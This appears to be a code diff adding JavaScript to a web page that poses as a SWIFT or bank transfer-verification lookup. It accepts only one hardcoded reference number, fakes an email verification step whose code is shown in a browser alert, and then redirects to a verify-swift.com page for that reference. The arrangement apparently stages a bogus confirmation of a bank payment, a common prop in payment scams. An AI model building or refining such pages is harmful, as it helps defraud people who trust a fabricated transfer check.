@@ -141,11 +141,218 @@
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
 <script>
-  // EmailJS initialize - SMTP işləmirsə, Gmail service yaradın
+  // EmailJS initialize
   emailjs.init("2bVi6WlSxFdQXILnk");
 
-  // ... bütün JavaScript kodunu buraya (eyni qalır) ...
-  // Ancaq əmin olun ki, yalnız EmailJS istifadə edir - Netlify Functions YOX!
+  // Menu toggle function
+  function toggleMenu() {
+    const nav = document.getElementById('navbar');
+    nav.classList.toggle('show');
+  }
+
+  // Modal functionality
+  const modal = document.getElementById('searchModal');
+  const openModalBtn = document.getElementById('openModalBtn');
+  const closeModalBtn = document.getElementById('closeModalBtn');
+  
+  // Step navigation elements
+  const step1Content = document.getElementById('step1Content');
+  const step2Content = document.getElementById('step2Content');
+  const step3Content = document.getElementById('step3Content');
+  const step1 = document.getElementById('step1');
+  const step2 = document.getElementById('step2');
+  const step3 = document.getElementById('step3');
+  
+  // Buttons
+  const nextToEmailBtn = document.getElementById('nextToEmailBtn');
+  const backToRefBtn = document.getElementById('backToRefBtn');
+  const sendCodeBtn = document.getElementById('sendCodeBtn');
+  const backToEmailBtn = document.getElementById('backToEmailBtn');
+  const verifyCodeBtn = document.getElementById('verifyCodeBtn');
+  const resendCode = document.getElementById('resendCode');
+  
+  // Input fields
+  const refInput = document.getElementById('ref');
+  const emailInput = document.getElementById('email');
+  const codeInput = document.getElementById('verificationCode');
+  const userEmailDisplay = document.getElementById('userEmailDisplay');
+  
+  // Messages
+  const loadingSend = document.getElementById('loadingSend');
+  const loadingResend = document.getElementById('loadingResend');
+  const successMessage = document.getElementById('successMessage');
+  const emailError = document.getElementById('emailError');
+  const codeError = document.getElementById('codeError');
+  const notFoundEl = document.getElementById('not-found');
+  
+  // Store verification code and reference
+  let currentVerificationCode = '';
+  let currentReference = '';
+  let userEmail = '';
+  
+  // Open modal
+  openModalBtn.addEventListener('click', function() {
+    modal.style.display = 'flex';
+    resetForm();
+  });
+  
+  // Close modal
+  closeModalBtn.addEventListener('click', function() {
+    modal.style.display = 'none';
+  });
+  
+  // Close modal when clicking outside
+  window.addEventListener('click', function(event) {
+    if (event.target === modal) {
+      modal.style.display = 'none';
+    }
+  });
+  
+  // Next to email step
+  nextToEmailBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    const ref = refInput.value.trim();
+    
+    if (ref === "COBA300525CH59279") {
+      currentReference = ref;
+      notFoundEl.style.display = "none";
+      // Show step 2
+      step1Content.style.display = "none";
+      step2Content.style.display = "block";
+      step1.classList.remove('active');
+      step2.classList.add('active');
+    } else {
+      notFoundEl.style.display = "block";
+    }
+  });
+  
+  // Back to reference step
+  backToRefBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    step2Content.style.display = "none";
+    step1Content.style.display = "block";
+    step2.classList.remove('active');
+    step1.classList.add('active');
+    emailError.style.display = 'none';
+  });
+  
+  // Send verification code - DEMO VERSION
+  sendCodeBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    const email = emailInput.value.trim();
+    
+    if (email && isValidEmail(email)) {
+      // Show loading
+      loadingSend.style.display = 'block';
+      emailError.style.display = 'none';
+      sendCodeBtn.disabled = true;
+      
+      // Generate 6-digit code
+      currentVerificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+      userEmail = email;
+      
+      // Simulate email sending - 2 saniyə gözlə
+      setTimeout(() => {
+        loadingSend.style.display = 'none';
+        sendCodeBtn.disabled = false;
+        
+        // Show step 3
+        step2Content.style.display = "none";
+        step3Content.style.display = "block";
+        step2.classList.remove('active');
+        step3.classList.add('active');
+        userEmailDisplay.textContent = email;
+        
+        // Kodu göstər
+        alert(`DEMO: Verification code: ${currentVerificationCode}\n\nIn production, this would be sent to ${email}`);
+        
+      }, 2000);
+      
+    } else {
+      alert("Please enter a valid email address.");
+    }
+  });
+  
+  // Resend code functionality - DEMO VERSION
+  resendCode.addEventListener('click', function() {
+    if (userEmail) {
+      // Generate new code
+      currentVerificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+      
+      alert(`DEMO: New verification code: ${currentVerificationCode}\n\nIn production, this would be sent to ${userEmail}`);
+    }
+  });
+  
+  // Back to email step
+  backToEmailBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    step3Content.style.display = "none";
+    step2Content.style.display = "block";
+    step3.classList.remove('active');
+    step2.classList.add('active');
+    codeError.style.display = 'none';
+  });
+  
+  // Verify code and redirect
+  verifyCodeBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    const code = codeInput.value.trim();
+    
+    if (code === currentVerificationCode) {
+      // Show success message
+      successMessage.style.display = 'block';
+      codeError.style.display = 'none';
+      verifyCodeBtn.disabled = true;
+      
+      // Redirect after 2 seconds
+      setTimeout(() => {
+        window.location.href = "https://verify-swift.com/checkswift/verification/COBA300525CH59279/BD10556814.html";
+      }, 2000);
+      
+    } else if (code.length === 6) {
+      codeError.style.display = 'block';
+      successMessage.style.display = 'none';
+    } else {
+      alert("Please enter a valid 6-digit code.");
+    }
+  });
+  
+  // Auto-tab between code digits
+  codeInput.addEventListener('input', function(e) {
+    if (this.value.length === 6) {
+      document.getElementById('verifyCodeBtn').focus();
+    }
+  });
+  
+  // Helper function to validate email
+  function isValidEmail(email) {
+    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return re.test(email);
+  }
+  
+  // Reset form to initial state
+  function resetForm() {
+    step1Content.style.display = "block";
+    step2Content.style.display = "none";
+    step3Content.style.display = "none";
+    step1.classList.add('active');
+    step2.classList.remove('active');
+    step3.classList.remove('active');
+    refInput.value = '';
+    emailInput.value = '';
+    codeInput.value = '';
+    notFoundEl.style.display = "none";
+    loadingSend.style.display = "none";
+    loadingResend.style.display = "none";
+    successMessage.style.display = "none";
+    emailError.style.display = "none";
+    codeError.style.display = "none";
+    sendCodeBtn.disabled = false;
+    verifyCodeBtn.disabled = false;
+    currentVerificationCode = '';
+    currentReference = '';
+    userEmail = '';
+  }
 </script>
 </body>
 </html>
